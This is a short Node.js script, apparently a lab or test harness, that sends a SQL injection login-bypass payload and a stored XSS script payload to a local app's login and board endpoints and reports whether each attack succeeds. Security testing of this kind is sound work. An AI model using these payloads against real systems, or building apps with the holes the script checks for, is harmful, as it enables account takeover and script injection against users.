const http = require('http');
const querystring = require('querystring');

function testSQLInjection() {
    console.log("Testing SQL Injection on Login...");
    const postData = querystring.stringify({
        username: "admin' --",
        password: "anything"
    });

    const options = {
        hostname: 'localhost',
        port: process.env.PORT || 3000,
        path: '/login',
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': postData.length
        }
    };

    const req = http.request(options, (res) => {
        console.log(`SQLi Status Code: ${res.statusCode}`);
        if (res.statusCode === 302 && res.headers.location === '/') {
            console.log("SUCCESS: SQL Injection successful! Redirected to home.");
        } else {
            console.log("FAILURE: SQL Injection failed.");
        }
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.write(postData);
    req.end();
}

function testXSS() {
    console.log("\nTesting XSS on Board...");
    const xssPayload = "<script>console.log('XSS_SUCCESS')</script>";
    const postData = querystring.stringify({
        content: xssPayload
    });

    const postOptions = {
        hostname: 'localhost',
        port: process.env.PORT || 3000,
        path: '/board',
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': postData.length
        }
    };

    const req = http.request(postOptions, (res) => {
        console.log(`XSS Post Status Code: ${res.statusCode}`);
        // Now fetch the board to see if the payload is there
        const port = process.env.PORT || 3000;
        http.get(`http://localhost:${port}/board`, (res) => {
            let data = '';
            res.on('data', (chunk) => { data += chunk; });
            res.on('end', () => {
                if (data.includes(xssPayload)) {
                    console.log("SUCCESS: XSS payload found in response body!");
                } else {
                    console.log("FAILURE: XSS payload not found.");
                }
            });
        });
    });

    req.write(postData);
    req.end();
}

// Wait a bit for server to start
setTimeout(() => {
    testSQLInjection();
    setTimeout(testXSS, 1000);
}, 2000);
